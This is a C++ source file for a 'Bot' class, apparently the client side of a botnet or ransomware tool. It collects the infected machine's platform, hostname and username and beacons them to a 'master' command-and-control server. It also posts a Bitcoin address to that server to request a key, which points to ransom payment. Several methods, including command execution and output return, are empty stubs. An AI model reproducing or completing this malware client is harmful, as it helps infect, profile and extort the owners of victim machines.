#include<stdio.h>
#include "bot.h"
#include "http.h"
#include <iostream>
using namespace std;
Bot::Bot(string p, string id, string user, string host, string m) {
    platform = p;
    uid = id;
    username = user;
    hostname = host;
    ransom = false;
    master = m;
}
string Bot::get_platform() {
    return platform;
}
string Bot::get_user() {
    return username;
}

string Bot::get_uid() {
    return uid;
}
string Bot::get_hostname() {
    return hostname;
}
string Bot::get_master() {
    return master;
}
bool Bot::get_ransom() {
    return ransom;
}
string Bot::form_ping_json() {
    string data;
    data += "{ \"platform\": ";
    data += "\"" + string(get_platform()) + "\",";
    data += " \"hostname\": ";
    data += "\"" + string(get_hostname()) + "\",";
    data += " \"username\": ";
    data += "\"" + string(get_user()) + "\" }";
    data += "\r\n";
    return data;
}

void Bot::display_message(string message) {

}
string Bot::ping_server() {
    string res = send_post(get_master() , "/api/" + get_uid() + "/status",  form_ping_json());
    return res;
}
string Bot::send_key() {
    return "end";
}
string Bot::request_key(string btc_addr) {
    string json = "{ \"btc_addr\":";
    json += "\"";
    json += btc_addr;
    json += "\" }";
    cout << json << endl;
    string res = send_post(get_master(), "/api/" + get_uid() + "/status", json);
    return res;
}
string Bot::send_output(string output) {
    return "end";
}
string Bot::run_command(string command) {
    return "end";
}
void Bot::run() {

}